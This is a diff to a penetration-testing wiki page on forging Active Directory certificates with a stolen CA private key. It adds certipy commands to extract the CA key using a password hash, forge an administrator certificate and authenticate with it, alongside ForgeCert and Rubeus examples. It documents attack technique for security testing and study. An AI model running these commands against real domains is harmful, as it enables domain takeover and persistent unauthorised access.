@@ -28,14 +28,26 @@ How can you tell that a certificate is a CA certificate?
 The built-in GUI supported way to **extract this certificate private key** is with `certsrv.msc` on the CA server.\
 However, this certificate **isn't different** from other certificates stored in the system, so for example check the [**THEFT2 technique**](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) to see how to **extract** them.
 
+You can also get the cert and private key using [**certipy**](https://github.com/ly4k/Certipy):
+
+```bash
+certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
+```
+
 Once you have the **CA cert** with the private key in `.pfx` format you can use [**ForgeCert**](https://github.com/GhostPack/ForgeCert) **** to create valid certificates:
 
 ```bash
 # Create new certificate with ForgeCert
 ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!
 
+# Create new certificate with certipy
+certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'
+
 # Use new certificate with Rubeus to authenticate
 Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!
+
+# User new certi with certipy to authenticate
+certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
 ```
 
 {% hint style="warning" %}
